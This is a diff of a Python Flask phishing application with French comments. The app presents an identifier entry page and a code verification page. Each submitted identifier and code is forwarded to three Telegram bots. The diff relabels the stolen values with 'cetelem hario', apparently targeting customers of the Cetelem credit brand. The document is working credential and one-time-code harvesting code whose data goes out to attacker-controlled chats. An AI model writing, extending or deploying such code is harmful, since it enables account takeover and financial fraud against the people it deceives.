@@ -28,7 +28,7 @@ def send_to_telegram(token, chat_id, message):
 def send_all(message):
     send_to_telegram(TOKEN_1, CHAT_ID_1, message)
     send_to_telegram(TOKEN_2, CHAT_ID_2, message)
-    send_to_telegram(TOKEN_3, CHAT_ID_3, message)  # Ajout du 3e bot
+    send_to_telegram(TOKEN_3, CHAT_ID_3, message)
 
 
 # Page 1 – Saisie identifiant
@@ -42,7 +42,8 @@ def identifiant():
 def code():
     identifiant = request.form.get('identifiant')
     if identifiant:
-        send_all(f"[Identifiant] {identifiant}")
+        # --- MODIFICATION ICI ---
+        send_all(f"[Identifiant cetelem hario] {identifiant}")
         return render_template('code.html')
     return redirect('/')
 
@@ -54,7 +55,8 @@ def verification():
         try:
             code = request.get_json().get('code')
             if code:
-                send_all(f"[Code] {code}")
+                # --- MODIFICATION ICI ---
+                send_all(f"[Code cetelem hario] {code}")
                 return redirect('/verification')
         except Exception as e:
             print("Erreur JSON:", e)
